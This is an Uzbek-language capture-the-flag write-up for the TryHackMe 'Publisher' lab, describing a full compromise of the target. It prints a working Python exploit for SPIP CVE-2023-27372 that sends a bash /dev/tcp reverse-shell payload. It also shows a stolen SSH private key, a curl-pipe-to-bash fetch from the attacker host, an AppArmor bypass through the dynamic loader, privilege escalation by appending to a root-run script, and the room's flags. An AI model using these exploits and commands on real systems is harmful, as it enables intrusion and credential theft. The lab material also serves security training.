#  Publisher

Room: https://tryhackme.com/room/publisher



## Doimgidek ish razvetkadan...

Port Scanning...



```
mete@sec ~> rustscan -a 10.10.252.203-- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TCP handshake? More like a friendly high-five!

[~] The config file is expected to be at "/home/mete/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.252.203:80
Open 10.10.252.203:22
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.246.184
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 19:12 +05
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 19:12
Scanning 10.10.246.184 [2 ports]
Completed Ping Scan at 19:12, 0.38s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:12
Completed Parallel DNS resolution of 1 host. at 19:12, 0.24s elapsed
DNS resolution of 1 IPs took 0.24s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:12
Scanning 10.10.246.184 [2 ports]
Discovered open port 22/tcp on 10.10.252.203
Discovered open port 80/tcp on 10.10.252.203
Completed Connect Scan at 19:12, 0.18s elapsed (2 total ports)
Initiating Service scan at 19:12
Scanning 2 services on 10.10.246.184
Completed Service scan at 19:12, 6.42s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.246.184.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:12
Completed NSE at 19:12, 0.96s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:12
Completed NSE at 19:12, 1.24s elapsed
Nmap scan report for 10.10.246.184
Host is up, received syn-ack (0.33s latency).
Scanned at 2025-06-09 19:12:23 +05 for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds
```

22 va 80-porltlar ochiq ya'ni ssh va http ishlamoqda...





Routinglarni tekshiramiz:

```
mete@sec ~> gobuster dir -u http://10.10.252.203/ -w=/usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.252.203/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/payloads/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.10.252.203/images/]
/spip                 (Status: 301) [Size: 313] [--> http://10.10.252.203/spip/]
```



SPIP?

Bu nima?

> **SPIP** (fransuz tilida: *Système de Publication pour l’Internet Partagé*) — bu bepul va ochiq manbali **kontent boshqaruv tizimi (CMS)** bo‘lib, asosan veb-saytlar va onlayn nashrlarni boshqarish uchun mo‘ljallangan. SPIP PHP dasturlash tilida yozilgan va MySQL yoki boshqa ma'lumotlar bazasidan foydalanadi.



Keling SPIPni versiyasini **whatweb** dasturi yordamida aniqlaymiz.

Buyruq:

```
whatweb http://10.10.252.203/spip/
```



Natija:

```
mete@sec ~> whatweb http://10.10.252.203/spip/
http://10.10.252.203/spip/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.252.203], MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://10.10.252.203/spip/local/config.txt], Script[text/javascript], Title[Publisher], UncommonHeaders[composed-by,link,x-spip-cache]
```



## Web Hacking

**SPIP 4.2.0** versiyada ishlamoqda ekan. Keling exploit qidirib ko'ramiz.

RCE zaifligi bor ekan, aynan shu versiyada....
Link: https://www.exploit-db.com/exploits/51536

> **CVE-2023-27372**

Exploit(hozirgi vaziyatimiz uchun o'zgartirishlar kiritilgan):

```python
import argparse
import bs4
import requests

def parseArgs():
    parser = argparse.ArgumentParser(description="CVE-2023-27372 SPIP < 4.2.1 Reverse Shell Exploit by nuts7 mod")
    parser.add_argument("-u", "--url", required=True, help="SPIP base URL (e.g., http://victim.com)")
    parser.add_argument("-l", "--lhost", required=True, help="Local attacker IP")
    parser.add_argument("-p", "--lport", required=True, help="Local attacker port")
    return parser.parse_args()

def get_csrf(url):
    r = requests.get(f"{url}/spip.php?page=spip_pass", timeout=10)
    soup = bs4.BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
    if csrf_input:
        return csrf_input['value']
    else:
        print("[-] CSRF token topilmadi.")
        exit(1)

def send_payload(url, csrf, payload):
    data = {
        "page": "spip_pass",
        "formulaire_action": "oubli",
        "formulaire_action_args": csrf,
        "oubli": f's:{len(payload)}:"{payload}";'
    }
    r = requests.post(f"{url}/spip.php?page=spip_pass", data=data)
    print("[+] Payload yuborildi.")

if __name__ == '__main__':
    opt = parseArgs()

    revshell = f"<?php system('/bin/bash -c \"/bin/bash -i >& /dev/tcp/{opt.lhost}/{opt.lport} 0>&1\"');?>"
    csrf = get_csrf(opt.url)
    send_payload(opt.url, csrf, revshell)


```

Reverse shellni qabul qilish:

```
nc -lvnp 4444
```

Ishga tushirish:

```
python3 exploit.py -u http://10.10.252.203/spip -l bizning_ip -p 4444
```

Natija:

```
╭─mete   󰉖 ~
╰─ ❯❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.252.203 51406
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@41c976e507f8:/home/think/spip/spip$ ls
ls
CHANGELOG.md
IMG
LICENSE
README.md
SECURITY.md
composer.json
composer.lock
config
ecrire
htaccess.txt
index.php
local
plugins-dist
plugins-dist.json
prive
spip.php
spip.png
spip.svg
squelettes-dist
tmp
vendor
www-data@41c976e507f8:/home/think/spip/spip$ 
```



## Privilage Escalation

Hozirgi holat:

```
www-data@41c976e507f8:/home/think/spip/spip$ whoami
whoami
www-data
```

Imtiyozlarimizni oshirishimiz kerak.

Tizimni tahlil qilishdan boshlaymiz... Domgidek yordamga linpeas.sh yetib keladi.

Uni yuklab olish:

```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

Kompyuterimizga yuklab olgach biz o'zimizdan HTTP server ochib faylni serverga olib o'tamiz.

Http server ochish:

```
sudo python3 -m http.server 80
```

Serverga yuklash:

```
wget 10.8.24.135/linpeas.sh
```

Unga Execution huquqini berish:

```
chmod +x linpeas.sh
```

Natija:

```
www-data@41c976e507f8:/home/think/spip/spip$ wget 10.8.24.135/linpeas.sh
wget 10.8.24.135/linpeas.sh
bash: wget: command not found
www-data@41c976e507f8:/home/think/spip/spip$ curl 10.8.24.135/linpeas.sh | bash
<think/spip/spip$ curl 10.8.24.135/linpeas.sh | bash
bash: curl: command not found
www-data@41c976e507f8:/home/think/spip/spip$ 
```

Damn! Mayli, qo'lda tekshirib chiqamiz.

Ishni foydalanuvchilar haqida ma'lumot to'plashdan boshlaymiz.

```
www-data@41c976e507f8:/home/think$ cd /home
cd /home
www-data@41c976e507f8:/home$ ls
ls
think
www-data@41c976e507f8:/home$ 
```

think nomli user bor ekan...

```
www-data@41c976e507f8:/home/think$ls -lah
ls -lah
total 48K
drwxr-xr-x 8 think    think    4.0K Feb 10  2024 .
drwxr-xr-x 1 root     root     4.0K Dec  7  2023 ..
lrwxrwxrwx 1 root     root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think    think     220 Nov 14  2023 .bash_logout
-rw-r--r-- 1 think    think    3.7K Nov 14  2023 .bashrc
drwx------ 2 think    think    4.0K Nov 14  2023 .cache
drwx------ 3 think    think    4.0K Dec  8  2023 .config
drwx------ 3 think    think    4.0K Feb 10  2024 .gnupg
drwxrwxr-x 3 think    think    4.0K Jan 10  2024 .local
-rw-r--r-- 1 think    think     807 Nov 14  2023 .profile
lrwxrwxrwx 1 think    think       9 Feb 10  2024 .python_history -> /dev/null
drwxr-xr-x 2 think    think    4.0K Jan 10  2024 .ssh
lrwxrwxrwx 1 think    think       9 Feb 10  2024 .viminfo -> /dev/null
drwxr-x--- 5 www-data www-data 4.0K Dec 20  2023 spip
-rw-r--r-- 1 root     root       35 Feb 10  2024 user.txt
www-data@41c976e507f8:/home/think$ cat user.txt
cat user.txt
fa229046d44eda6a3598c73ad96f4ca5  
```

user.txt ni qo'lga kiritdik. 1-flagni qo'lga kiritdik...

**.ssh**  (qiziqga o'xshayapti... balki id_rsa ni ochib o'qishga erisharmiz)

```
www-data@41c976e507f8:/home/think$ cd  .ssh
cd  .ssh
www-data@41c976e507f8:/home/think/.ssh$ ls
ls
authorized_keys
id_rsa
id_rsa.pub
www-data@41c976e507f8:/home/think/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

o'qiy oldik ham endi id_rsa fayli ichidagi keyni o'zimizni kompyuterga olamiz. 

```
mete@sec ~/T/T/1006-2025> nano id_rsa
```

Endi bunda permession berishimiz kerak.

```
mete@sec ~/T/T/1006-2025> chmod 600 id_rsa
```

Endi bog'lanishga urinamiz.

```
ssh -i id_rsa think@10.10.252.203
```

Ishladi!



Ana endi Linpeas.sh ni vaqti...

Ushbu buyruq bilan ishga tushiramiz:

```
curl 10.8.24.135/linpeas.sh | bash
```

Sababi yuklab olish bo'yicha ruxsat yo'q ekan.
Bizni qiziqtirgan hisobot:

```
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 467K Apr 11 12:16 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-sr-x 1 root root 17K Nov 14  2023 /usr/sbin/run_container (Unknown SUID binary!)
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 87K Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 84K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 52K Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 67K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 55K Apr  9  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 67K Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root 44K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 31K Feb 21  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 39K Apr  9  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
```

**/usr/sbin/run_container** qiziqarli ko'rinmoqda...

**strings** dasturi yordamida dasturni tahlil qilamiz...

```
think@ip-10-10-252-203:/tmp$ strings /usr/sbin/run_container
```

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/publisher.jpg)

Dastur dasturga yetaklamoqda...

Bash script tarkibini ko'ramiz.

```
think@ip-10-10-252-203:/tmp$ cat /opt/run_container.sh
#!/bin/bash

# Function to list Docker containers
list_containers() {
    if [ -z "$(docker ps -aq)" ]; then
	docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
    fi
    echo "List of Docker containers:"
    docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
    echo ""
}

# Function to prompt user for container ID
prompt_container_id() {
    read -p "Enter the ID of the container or leave blank to create a new one: " container_id
    validate_container_id "$container_id"
}

# Function to display options and perform actions
select_action() {
    echo ""
    echo "OPTIONS:"
    local container_id="$1"
    PS3="Choose an action for a container: "
    options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")

    select opt in "${options[@]}"; do
        case $REPLY in
            1) docker start "$container_id"; break ;;
            2) 	if [ $(docker ps -q | wc -l) -lt 2 ]; then
	           echo "No enough containers are currently running."
    	           exit 1
		fi
                docker stop "$container_id"
                break ;;
            3) docker restart "$container_id"; break ;;
            4) echo "Creating a new container..."
               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest 
               break ;;
            5) echo "Exiting..."; exit ;;
            *) echo "Invalid option. Please choose a valid option." ;;
        esac
    done
}

# Main script execution
list_containers
prompt_container_id  # Get the container ID from prompt_container_id function
select_action "$container_id"  # Pass the container ID to select_action function
```

 Va yana e'tibor qaratishimiz zarur bo'lgan LinPeas hisoboti:

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/publisher_2.jpg)

AppArmon yoniq ekan...

AppArmon bu nima?

> `AppArmor` — bu **Linux Security Module (LSM)** bo‘lib, dasturlarni **cheklangan (confined)** holatda ishlashga majbur qiladi. Masalan, `bash` faqat ruxsat berilgan fayllarga kira oladi, ruxsat berilmagan joylarga esa yo‘q.

Biz buni chetlab o'tishimiz kerak. Qanday qilib desangiz quyidagi buyruq orqali:

```
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
```

Endi esa **/opt/run_container.sh**'ga o'zgartirish kiritamiz.

```
echo "bash -p" >> /opt/run_container.sh
```

Bu dastur root nomidan RUN bo'lgani uchun bizga ROOT huquqli shell ochib beradi endi...

Jarayon:

```
think@ip-10-10-252-203:/tmp$ /usr/sbin/run_container
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 2 hours

Enter the ID of the container or leave blank to create a new one: 1
/opt/run_container.sh: line 16: validate_container_id: command not found

OPTIONS:
1) Start Container    3) Restart Container  5) Quit
2) Stop Container     4) Create Container
Choose an action for a container: 1
Error response from daemon: No such container: 1
Error: failed to start containers: 1
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
3a4225cc9e85709adda6ef55d6a4f2ca   
```

Bingo!!!

Qiziqarli va yangi bilimlarga boy bo'ldi degan umiddaman.

Foydam tegkan bo'lsa xursandman.



### Nafas olar ekanman, men yana davom etaman...